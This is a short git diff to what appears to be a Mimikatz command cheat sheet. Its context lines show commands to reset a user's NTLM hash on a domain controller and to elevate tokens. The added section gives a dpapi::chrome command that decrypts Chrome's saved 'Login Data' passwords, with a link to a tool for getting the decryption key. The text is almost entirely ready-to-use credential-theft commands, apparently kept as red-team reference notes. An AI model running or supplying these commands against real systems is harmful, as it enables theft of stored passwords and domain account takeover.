@@ -71,3 +71,10 @@ lsadump::setntlm /server:<dc>.<domain>.local /user:<user> /ntlm:<ntlm>
 token::elevate [/user:<user>] [/process:<id>]
 ```
 
+# dpapi
+## chrome
+> **Note**
+> Key can be obtained using [ChromiumKeyDump](https://github.com/crypt0p3g/bof-collection)).
+```console
+dpapi::chrome /in:"C:\Users\Administrator\Downloads\Login Data" /key:<hex>
+```
